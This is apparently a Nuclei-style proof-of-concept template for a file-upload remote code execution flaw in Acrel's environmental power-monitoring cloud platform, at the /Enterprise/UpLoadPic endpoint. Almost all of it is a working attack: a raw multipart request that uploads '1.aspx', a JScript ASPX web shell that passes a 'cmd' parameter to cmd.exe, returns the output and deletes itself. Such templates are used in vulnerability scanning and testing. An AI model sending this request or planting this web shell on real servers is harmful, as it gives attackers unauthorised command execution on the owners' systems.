id: poc-qg7u9rfgor1u0gyv
info:
  name: 安科瑞环保用电监管云平台UpLoadPic文件上传致RCE漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: rce,file-upload,2025
http:
- raw:
  - 'POST /Enterprise/UpLoadPic HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

    Accept: */*

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRDazwgc1RnTaskmR


    ------WebKitFormBoundaryRDazwgc1RnTaskmR

    Content-Disposition: form-data; name="file"; filename="1.aspx"


    <%@ Page Language="Jscript" validateRequest="false" %>

    <%

    var c=new System.Diagnostics.ProcessStartInfo("cmd");

    var e=new System.Diagnostics.Process();

    var out:System.IO.StreamReader,EI:System.IO.StreamReader;

    c.UseShellExecute=false;

    c.RedirectStandardOutput=true;

    c.RedirectStandardError=true;

    e.StartInfo=c;

    c.Arguments="/c " + Request.Item["cmd"];

    e.Start();

    out=e.StandardOutput;

    EI=e.StandardError;

    e.Close();

    Response.Write(out.ReadToEnd() + EI.ReadToEnd());

    System.IO.File.Delete(Request.PhysicalPath);

    Response.End();%>

    ------WebKitFormBoundaryRDazwgc1RnTaskmR--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
